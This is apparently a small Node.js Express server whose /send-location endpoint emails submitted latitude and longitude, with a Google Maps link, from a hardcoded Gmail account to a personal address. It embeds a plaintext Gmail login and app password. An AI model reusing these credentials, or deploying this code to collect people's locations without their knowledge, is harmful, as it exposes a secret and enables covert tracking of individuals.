const express = require('express');
const nodemailer = require('nodemailer');
const path = require('path');
const bodyParser = require('body-parser');

const app = express();
const PORT = 3000;

// Serve static files
app.use(express.static(path.join(__dirname, 'public')));
app.use(bodyParser.json());

// Replace with your credentials
const transporter = nodemailer.createTransport({
  service: 'Gmail',
  auth: {
    user: 'roasttv150823@gmail.com',
    pass: 'akvczzjvfbjxcufc',
  },
});

app.post('/send-location', (req, res) => {
  const { latitude, longitude } = req.body;

  const mailOptions = {
    from: 'roasttv150823@gmail.com',
    to: 'siharesandeep25@gmail.com',
    subject: 'New Location Received',
    text: `Latitude: ${latitude}, Longitude: ${longitude}\n\nGoogle Maps Link: https://www.google.com/maps?q=${latitude},${longitude}`,
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error(error);
      return res.status(500).json({ message: 'Failed to send email' });
    }
    console.log('Email sent: ' + info.response);
    res.json({ message: 'Location sent successfully' });
  });
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
